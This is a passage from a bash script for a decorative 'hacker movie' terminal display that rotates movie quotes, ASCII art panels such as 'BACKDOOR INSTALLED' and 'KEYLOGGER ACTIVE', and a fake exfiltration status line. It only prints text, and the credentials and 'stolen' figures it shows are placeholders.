      ⠀⠀⠀⠀⠀⠀⢀⣤⣤⡀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⢀⣿⣿⣿⡀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⢸⣿⣿⣿⡇⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠘⣿⣿⣿⠃⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠈⠿⠁⠀⠀⠀⠀⠀⠀
      ⠀⢀⣀⣤⣤⣤⣤⣤⣤⣤⣤⣀⡀⠀
      ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
       >>> ENCRYPTION KEY <<<
ART
echo -e "${N}" ;;
    6) echo -e "${C}"
cat << 'ART'
      ┌─────────────────────┐
      │  ┌───┐   ┌───┐     │
      │  │ 0 │ → │ 1 │     │
      │  └─┬─┘   └─┬─┘     │
      │    │   ╲╱   │       │
      │    │   ╱╲   │       │
      │  ┌─┴─┐   ┌─┴─┐     │
      │  │ 1 │ ← │ 0 │     │
      │  └───┘   └───┘     │
      │  >>> QUANTUM BIT <<< │
      └─────────────────────┘
ART
echo -e "${N}" ;;
    7) echo -e "${Y}"
cat << 'ART'
           ___
          |   |
          |   |
          |   |
     _____|   |_____
    |               |
    |   FIREWALL    |
    |   BYPASSED    |
    |_______________|
    |               |
    |_______________|
ART
echo -e "${N}" ;;
    8) echo -e "${G}"
cat << 'ART'
     ╭──────────────────╮
     │  ⚡ POWER GRID   │
     │  ▓▓▓▓▓▓▓▓░░ 80%  │
     │  OVERRIDING...    │
     │  ▓▓▓▓▓▓▓▓▓▓ 100% │
     │  ⚠ GRID CAPTURED │
     ╰──────────────────╯
ART
echo -e "${N}" ;;
    9) echo -e "${R}"
cat << 'ART'
      ▄▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▄
      █  SYSTEM ALERT   █
      █  ╔═══════════╗  █
      █  ║ BACKDOOR  ║  █
      █  ║ INSTALLED ║  █
      █  ╚═══════════╝  █
      ▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀
ART
echo -e "${N}" ;;
    10) echo -e "${M}"
cat << 'ART'
       .  *  .   .  *
    *  .  SATELLITE  .  *
     .   INTERCEPT  .
    *  .  ACTIVE  .  *
       .  *  .   .  *
       ╱╲    ╱╲    ╱╲
      ╱  ╲  ╱  ╲  ╱  ╲
     ╱    ╲╱    ╲╱    ╲
ART
echo -e "${N}" ;;
    11) echo -e "${C}"
cat << 'ART'
      ┌──────────────────┐
      │ KEYLOGGER ACTIVE │
      ├──────────────────┤
      │ ████░░░░░░ 40%   │
      │ Capturing...     │
      │ > p@ssw0rd123    │
      │ > admin:root     │
      │ > sk-ant-api03-  │
      └──────────────────┘
ART
echo -e "${N}" ;;
    esac
}

# Infinite rotation: quote → art → quote → art...
QUOTE_IDX=$ART_SEED
ART_IDX=$((ART_SEED + 4))

while true; do
    clear

    # Show a quote in a box
    IFS='|' read -r quote_text quote_movie quote_color <<< "${QUOTES[$((QUOTE_IDX % ${#QUOTES[@]}))]}"
    echo
    echo
    echo -e "  ${quote_color}╔══════════════════════════════════════════════════════════════╗${N}"
    echo -e "  ${quote_color}║${N}                                                              ${quote_color}║${N}"
    printf  "  ${quote_color}║${N}   ${W}\"${quote_text}\"${N}%*s${quote_color}║${N}\n" $((58 - ${#quote_text})) ""
    echo -e "  ${quote_color}║${N}                                                              ${quote_color}║${N}"
    printf  "  ${quote_color}║${N}   ${DG}— ${quote_movie}${N}%*s${quote_color}║${N}\n" $((55 - ${#quote_movie})) ""
    echo -e "  ${quote_color}║${N}                                                              ${quote_color}║${N}"
    echo -e "  ${quote_color}╚══════════════════════════════════════════════════════════════╝${N}"
    echo
    sleep 3
    matrix_transition 8

    clear

    # Show an art piece
    echo
    echo
    show_extra_art $ART_IDX
    echo

    # Show status footer
    echo -e "  ${DG}────────────────────────────────────────────────────${N}"
    printf  "  ${R}◉${N} ${W}%-20s${N} ${DG}│${N} ${Y}%-15s${N} ${DG}│${N} ${G}%s${N}\n" "${HOST}" "${HACKER}" "${EXFIL_SIZE} stolen"
    echo -e "  ${DG}────────────────────────────────────────────────────${N}"
    echo
    sleep 3
    matrix_transition 8

    QUOTE_IDX=$((QUOTE_IDX + 1))
    ART_IDX=$((ART_IDX + 1))
done
